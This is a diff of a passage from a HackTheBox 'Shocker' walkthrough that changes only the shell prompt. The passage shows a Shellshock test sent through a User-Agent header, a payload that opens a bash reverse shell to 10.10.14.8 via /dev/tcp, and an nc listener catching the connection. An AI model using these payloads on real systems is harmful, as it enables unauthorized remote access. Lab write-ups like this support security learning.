@@ -32,7 +32,7 @@ looking at this
 
 try it out.
 ```
-kali@kali:~/HTB/shocker$ curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://shocker.htb/cgi-bin/user.sh 2>/dev/null
+bibo318@parrot:~/HTB/shocker$ curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://shocker.htb/cgi-bin/user.sh 2>/dev/null
 VULNERABLE TO SHELLSHOCK
 
 Content-Type: text/plain
@@ -47,11 +47,11 @@ Just an uptime test script
 the victim server is vulnerable to shell shock. so let try to craft a bash reverse shell
 
 ```
-kali@kali:~/HTB/shocker$ curl -H 'User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.8/6969 0>&1' http://shocker.htb/cgi-bin/user.sh 2>/dev/null
+bibo318@parrot:~/HTB/shocker$ curl -H 'User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.8/6969 0>&1' http://shocker.htb/cgi-bin/user.sh 2>/dev/null
 ```
 nc listen to port 6969
 ```
-kali@kali:~/HTB/shocker$ nc -nlvp 6969
+bibo318@parrot:~/HTB/shocker$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.56] 33820
 bash: no job control in this shell
